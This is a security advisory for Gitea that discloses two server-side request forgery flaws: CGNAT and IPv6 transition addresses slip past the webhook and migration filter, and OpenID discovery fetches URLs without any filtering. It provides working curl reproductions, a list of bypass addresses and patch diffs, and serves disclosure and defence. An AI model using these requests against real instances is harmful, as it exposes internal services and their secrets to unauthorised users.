# [H] Gitea: Two SSRF findings

## Summary
Severity: High
Advisory: GHSA-2fcr-jfvc-vgg2
CVE: CVE-2026-58314
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-2fcr-jfvc-vgg2
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
| --- | --- |
| Versions tested | `gitea/gitea:1.26.2` (digest `sha256:7d13848af12645600a5f9d93ee2560daa9c6fa6b5b859b7bff3a5e1c0b661031`); `gitea/gitea:latest` resolves to the same digest at time of writing |
| Source review | `git checkout v1.26.2` (commit `2c749ce`) |
| Reproduction | `bash run_poc.sh` (single shot: brings up containers, runs three PoCs, prints captured evidence, tears down on exit) |
| Files touched by the fixes | `modules/hostmatcher/hostmatcher.go`, `modules/auth/openid/openid.go` |

## Summary

Gitea guards outbound HTTP from webhooks and repo migration with `net.Dialer.Control`, the correct hook point. The IP classifier behind it misses ten address families, of which CGNAT (100.64.0.0/10) is the practically important one because it is plain IPv4 and is used today by Tailscale, AWS VPC secondary CIDRs, and several Kubernetes pod-CIDR conventions. Any logged-in user can create a webhook pointing at an internal CGNAT host. The full HTTP response from that host (status, headers, body up to 1 MB) is stored in the webhook delivery log and rendered to the webhook owner on the hook detail page. The same gap applies to repo migration.

Separately, the OpenID sign-in form at `/user/login/openid` fetches the user-supplied provider URL server-side via `openid-go`, which uses `http.DefaultClient`. No `hostmatcher`, no IP filter, no CSRF, no authentication. When OpenID sign-in is enabled, anyone on the internet can drive Gitea into making arbitrary GET requests against internal IPs.

Both reproduce on `gitea/gitea:1.26.2` (current stable) in default configuration. The bundled `run_poc.sh` reproduces all three primitives end-to-end in about one minute and tears the lab down at exit.

---

## Finding 1: hostmatcher classifier passes CGNAT and IPv6 transition prefixes

### The bug

`modules/hostmatcher/hostmatcher.go:107-119`, the `external` builtin:

```go
case MatchBuiltinExternal:
    if ip.IsGlobalUnicast() && !ip.IsPrivate() {
        return true
    }
```

`IsGlobalUnicast() && !IsPrivate()` was written for stack bookkeeping, not as a security boundary. It catches RFC 1918, RFC 4193 ULA, link-local, loopback, and the IPv4-mapped `::ffff:0:0/96` prefix (because `IsPrivate` un-embeds that range via `net.IP.To4()`). Every other IPv6 transition prefix returns nil from `To4()`, so the embedded IPv4 is invisible to the classifier.

Address families that pass the guard, verified live on 1.26.2:

| Family | Example | Why missed |
| --- | --- | --- |
| CGNAT, RFC 6598 | `100.64.0.1` | `IsPrivate()` checks 10/8, 172.16/12, 192.168/16 only |
| NAT64 well-known, RFC 6052 | `64:ff9b::7f00:1` | `To4()` un-embeds only `::ffff:0:0/96` |
| NAT64 local-use, RFC 8215 | `64:ff9b:1::1` | same |
| 6to4, RFC 3056 | `2002:7f00:1::` | same |
| Teredo, RFC 4380 | `2001::abcd` | same |
| IPv4-compatible | `::169.254.169.254` | same |
| SIIT, RFC 6145 | `::ffff:0:7f00:1` | same |
| Documentation | `2001:db8::1` | same |
| Benchmarking, RFC 2544 | `198.18.0.1` | not in any private check |
| TEST-NET, RFC 5737 | `192.0.2.1` | same |

CGNAT is the one that needs no IPv6 infrastructure. The 100.64.0.0/10 block overlaps with Tailscale (100.x), AWS VPC secondary CIDRs, and several Kubernetes pod-CIDR conventions. Any Gitea instance that shares a network with services on a CGNAT address is exploitable in default config.

NAT64, 6to4, Teredo, and SIIT need the matching gateway on the network to actually carry the packet. The guard still passes the address, so the bug is real at the guard layer; impact depends on whether the deployment has the corresponding transition mechanism. Lab confirmed: the guard passes, the connection then fails with `network is unreachable` on a stock Linux box.

The wrapping `net.Dialer.Control` callback is structurally correct (fires per redirect hop, post-DNS, pre-connect). The classifier is the only broken part.

### Reachable sinks

Webhook delivery, `services/webhook/deliver.go`:

```go
// :321-328
webhookHTTPClient = &http.Client{
    Timeout: timeout,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: setting.Webhook.SkipTLSVerify},
        Proxy:           webhookProxy(allowedHostMatcher),
        DialContext:     hostmatcher.NewDialContext("webhook", allowedHostMatcher, nil, setting.Webhook.ProxyURLFixed),
    },
}
```

Authentication required: any logged-in user via user-level hooks (`POST /api/v1/user/hooks`) or repo-admin via repo-level hooks. The response body is captured up to 1 MB:

```go
// :268
p, err := util.ReadWithLimit(resp.Body, 1024*1024)
```

and stored in `hook_task.response_content`, then rendered on `/{owner}/{repo}/settings/hooks/{id}`.

Repo migration, `services/migrations/http_client.go:27`:

```go
DialContext: hostmatcher.NewDialContext("migration", allowList, blockList, setting.Proxy.ProxyURLFixed),
```

with a pre-flight check at `services/migrations/migrate.go:43-87` (`IsMigrateURLAllowed`). Both layers call the same `MatchIPAddr`, so the pre-flight does not add coverage for the classifier gap.

### History

Residual of CVE-2018-15192. The `hostmatcher` module landed in PR #17482 (2021) with `external` as the default. The classifier gap has been present from that PR.

### Reproduce

`run_poc.sh` is the one-shot reproduction. It pulls `gitea/gitea:1.26.2`, brings up a Docker network on `100.64.0.0/24` with a mock internal service at `100.64.0.2:8080`, creates a non-admin user, runs all three PoCs, runs a sanity check that confirms RFC 1918 / loopback / ULA / link-local are still blocked, and tears the lab down at exit.

Expected console output (trimmed):

```
[poc 1] webhook to CGNAT internal service (100.64.0.2:8080)
  ok  created webhook id=1, default ALLOWED_HOST_LIST (external builtin) allowed the CGNAT URL
  internal response captured in hook_task.response_content:
    {"status":200,
     "headers":{"X-Internal-Secret":"CGNAT-INTERNAL-ONLY",
                "Content-Type":"application/json", ...},
     "body":"{\"proof\": \"CGNAT_INTERNAL_SERVICE_RESPONSE_BODY\",
              \"client_seen\": \"100.64.0.10\",
              \"secret\": \"do-not-leak-outside-network\"}"}
  ok  headline confirmed: X-Internal-Secret header reflected to webhook owner

[poc 2] migration clone from CGNAT (http://100.64.0.2:8080/fake.git)
  migrate API returned HTTP 201
  mock log:
    GET /fake.git/info/refs?service=git-upload-pack  from=100.64.0.10
    GET /fake.git/HEAD  from=100.64.0.10
  ok  git smart-HTTP exchange from gitea -> 100.64.0.2 confirmed

[sanity] verify the guard still rejects RFC 1918 / loopback / link-local
  ok  loopback v4   (http://127.0.0.1:8080/)    blocked
  ok  RFC 1918      (http://10.0.0.1:8080/)     blocked
  ok  loopback v6   (http://[::1]:8080/)        blocked
  ok  ULA           (http://[fc00::1]:8080/)    blocked
  ok  link-local v4 (http://169.254.169.254/)   blocked
```

Boiled down to raw HTTP, the webhook primitive is three calls:

```bash
TOKEN=$(curl -s -u attacker:pw -X POST \
  http://localhost:3000/api/v1/users/attacker/tokens \
  -H 'Content-Type: application/json' \
  -d '{"name":"poc","scopes":["write:repository","write:user"]}' \
  | sed -n 's/.*"sha1":"\([^"]*\)".*/\1/p')

curl -X POST http://localhost:3000/api/v1/repos/attacker/ssrf-lab/hooks \
  -H "Authorization: token $TOKEN" -H 'Content-Type: application/json' \
  -d '{"type":"gitea",
       "config":{"url":"http://100.64.0.2:8080/internal","content_type":"json"},
       "events":["push"],"active":true}'

curl -X POST http://localhost:3000/api/v1/repos/attacker/ssrf-lab/hooks/1/tests \
  -H "Authorization: token $TOKEN"
```

The internal target's response is then visible on `/{owner}/{repo}/settings/hooks/1`, or in the SQLite column `hook_task.response_content`.

### Suggested fix

Add an explicit non-routable prefix list to the `external` builtin:

```diff
--- a/modules/hostmatcher/hostmatcher.go
+++ b/modules/hostmatcher/hostmatcher.go
@@ -3,8 +3,9 @@ package hostmatcher

 import (
 	"net"
+	"net/netip"
 	"path/filepath"
 	"slices"
 	"strings"
 )

+var nonRoutablePrefixes = []netip.Prefix{
+	netip.MustParsePrefix("100.64.0.0/10"),   // CGNAT, RFC 6598
+	netip.MustParsePrefix("64:ff9b::/96"),    // NAT64 well-known, RFC 6052
+	netip.MustParsePrefix("64:ff9b:1::/48"),  // NAT64 local-use, RFC 8215
+	netip.MustParsePrefix("2001::/32"),       // Teredo, RFC 4380
+	netip.MustParsePrefix("2002::/16"),       // 6to4, RFC 3056
+	netip.MustParsePrefix("::ffff:0:0/96"),   // SIIT (deprecated, still routable through translators)
+	netip.MustParsePrefix("::/96"),           // IPv4-compatible (deprecated)
+	netip.MustParsePrefix("2001:db8::/32"),   // documentation
+	netip.MustParsePrefix("198.18.0.0/15"),   // benchmarking
+	netip.MustParsePrefix("192.0.0.0/24"),    // IETF protocol assignments
+	netip.MustParsePrefix("192.0.2.0/24"),    // TEST-NET-1
+	netip.MustParsePrefix("198.51.100.0/24"), // TEST-NET-2
+	netip.MustParsePrefix("203.0.113.0/24"),  // TEST-NET-3
+}
+
+func isNonRoutable(ip net.IP) bool {
+	a, ok := netip.AddrFromSlice(ip)
+	if !ok {
+		return true
+	}
+	for _, p := range nonRoutablePrefixes {
+		if p.Contains(a) {
+			return true
+		}
+	}
+	return false
+}
+
 func (hl *HostMatchList) checkIP(ip net.IP) bool {
 	if slices.Contains(hl.patterns, "*") {
 		return true
 	}
 	for _, builtin := range hl.builtins {
 		switch builtin {
 		case MatchBuiltinExternal:
-			if ip.IsGlobalUnicast() && !ip.IsPrivate() {
+			if ip.IsGlobalUnicast() && !ip.IsPrivate() && !isNonRoutable(ip) {
 				return true
 			}
```

`hostmatcher_test.go` currently has zero cases for any of the ten families. Suggested additions: at least one IPv4 (CGNAT 100.64.0.1) and four IPv6 (NAT64 well-known, NAT64 local-use, 6to4, IPv4-compatible).

---

## Finding 2: OpenID discovery has no SSRF guard

### The bug

`routers/web/auth/openid.go:99`:

```go
url, err := openid.RedirectURL(id, redirectTo, setting.AppURL)
```

The thin wrapper at `modules/auth/openid/openid.go:36` forwards directly to the package-level function in `github.com/yohcop/openid-go`. That package keeps a `defaultInstance`:

```go
// github.com/yohcop/openid-go v1.0.1, openid.go:15
var defaultInstance = NewOpenID(http.DefaultClient)
```

`http.DefaultClient` has no transport customization, no `Dialer.Control`, no IP filtering. `openid-go` issues a server-side GET to the user-supplied URL to discover the OpenID endpoint. The fetch reaches any address Gitea can route to, including loopback, RFC 1918, link-local, and the same families listed in Finding 1.

The form does not enforce CSRF on this path. The endpoint accepts unauthenticated requests by design (it is the login page).

### Default exposure

The setting that gates this endpoint is read from the `[openid]` section of `app.ini`:

```go
// modules/setting/service.go:268-270
func loadOpenIDSetting(rootCfg ConfigProvider) {
	sec := rootCfg.Section("openid")
	Service.EnableOpenIDSignIn = sec.Key("ENABLE_OPENID_SIGNIN").MustBool(!InstallLock)
```

It defaults to `!InstallLock`, so on a fresh container before the install wizard completes the endpoint is enabled. After `INSTALL_LOCK=true` it defaults off. Deployments that use OpenID for SSO set it explicitly. (Note for anyone reproducing in Docker: the entrypoint routes `GITEA__service__ENABLE_OPENID_SIGNIN` into `[service]`, where the loader does not read it. Use `GITEA__openid__ENABLE_OPENID_SIGNIN=true`.)

### History

Extends CVE-2021-45325. The 2019 fix (PR #5705) hid the error string that previously leaked internal topology to the requester. It did not add filtering to the discovery fetch itself. The underlying SSRF primitive remains.

### Reproduce

One request, no cookie, no token:

```bash
curl -X POST http://localhost:3000/user/login/openid \
  --data-urlencode 'openid=http://INTERNAL:PORT/path'
```

Captured by the internal target (also shown in `run_poc.sh`'s `[poc 3]` block):

```
GET /poc3-openid  from=100.64.0.10
GET /poc3-openid  from=100.64.0.10
```

Two GETs (one for normalize, one for redirect-URL discovery), both unauthenticated, both with `Accept: application/xrds+xml`.

Exfiltration is blind. `openid-go` parses the response as XRDS or HTML for endpoint discovery and does not return the body to the caller. Useful for internal port scanning, IMDS probing, and timing oracles. Lower direct impact than Finding 1, but reachable without an account.

### Suggested fix

Wire the `hostmatcher` into a custom `*http.Client` and create a dedicated `openid-go` instance:

```diff
--- a/modules/auth/openid/openid.go
+++ b/modules/auth/openid/openid.go
@@ -1,10 +1,28 @@
 package openid

-import "github.com/yohcop/openid-go"
+import (
+	"net/http"
+	"time"
+
+	"code.gitea.io/gitea/modules/hostmatcher"
+	"code.gitea.io/gitea/modules/proxy"
+	"github.com/yohcop/openid-go"
+)

 var (
 	nonceStore     = openid.NewSimpleNonceStore()
 	discoveryCache = newTimedDiscoveryCache(24 * time.Hour)
+	instance       = openid.NewOpenID(&http.Client{
+		Timeout: 30 * time.Second,
+		Transport: &http.Transport{
+			Proxy: proxy.Proxy(),
+			DialContext: hostmatcher.NewDialContext("openid",
+				hostmatcher.ParseHostMatchList("openid", hostmatcher.MatchBuiltinExternal),
+				nil, nil),
+		},
+	})
 )

 func Verify(fullURL string) (id string, err error) {
-	return openid.Verify(fullURL, discoveryCache, nonceStore)
+	return instance.Verify(fullURL, discoveryCache, nonceStore)
 }

 // RedirectURL redirects browser
 func RedirectURL(id, callbackURL, realm string) (string, error) {
-	return openid.RedirectURL(id, callbackURL, realm)
+	return instance.RedirectURL(id, callbackURL, realm)
 }
```

`openid.Normalize` does not perform HTTP and does not need to change. Once Finding 1 is fixed, this `MatchBuiltinExternal` instance picks up the new prefix coverage automatically.

---

## POC script
[run_poc.sh](https://github.com/user-attachments/files/28193359/run_poc.sh)

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-2fcr-jfvc-vgg2
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
